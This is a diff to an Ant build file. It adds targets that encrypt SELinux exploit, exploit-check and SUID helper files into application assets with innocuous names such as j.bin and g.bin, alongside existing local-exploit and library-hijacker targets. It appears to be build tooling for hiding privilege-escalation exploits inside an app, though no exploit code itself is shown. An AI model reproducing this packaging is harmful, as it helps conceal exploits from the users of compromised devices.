@@ -108,14 +108,29 @@
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/suidext" outputFile="assets/s.bin" />
 	</target>
 	
+	<target name="encrypt-selinuxsuid">
+		<delete file="assets/j.bin" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/selinux_suidext" outputFile="assets/j.bin" />
+	</target>
+	
 	<target name="encrypt-exploitcheck">
 		<delete file="assets/h.bin" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/expl_check" outputFile="assets/h.bin" />
 	</target>
 	
+	<target name="encrypt-selinuxexploitcheck">
+		<delete file="assets/d.bin" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/selinux_check" outputFile="assets/d.bin" />
+	</target>
+	
 	<target name="encrypt-localexploit">
 		<delete file="assets/l.bin" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/local_exploit" outputFile="assets/l.bin" />
+	</target>
+	
+	<target name="encrypt-selinuxexploit">
+		<delete file="assets/g.bin" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/selinux_exploit" outputFile="assets/g.bin" />
 	</target>
 	
 	<target name="encrypt-hijacklibrary">
@@ -128,7 +143,8 @@
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/hijack" outputFile="assets/m.bin" />
 	</target>
 
-	<target name="libs" depends="encrypt-suid, encrypt-exploitcheck, encrypt-localexploit, encrypt-hijacklibrary, encrypt-hijacker">
+	<target name="libs" depends="encrypt-suid, encrypt-selinuxsuid, encrypt-exploitcheck, encrypt-localexploit, encrypt-selinuxexploitcheck, 
+	    encrypt-hijacklibrary, encrypt-hijacker, encrypt-selinuxexploit">
 	</target>
 
 
